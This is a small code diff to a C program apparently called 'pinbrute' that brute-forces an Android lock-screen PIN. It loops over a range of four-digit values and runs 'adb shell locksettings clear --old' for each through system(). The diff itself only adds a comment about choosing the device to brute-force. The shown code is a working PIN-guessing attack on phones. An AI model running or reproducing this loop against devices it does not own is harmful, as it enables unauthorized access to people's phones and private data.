@@ -24,7 +24,7 @@ printf("Usage: pinbrute -b min max\n");
 if (b_flag == 1) {
   for (i= start; i <= end; i++) {
     char command[100];
-    sprintf(command, "adb shell locksettings clear --old %04d", i);
+    sprintf(command, "adb shell locksettings clear --old %04d", i); //you need choose device to brute
     system(command);
   }
 }
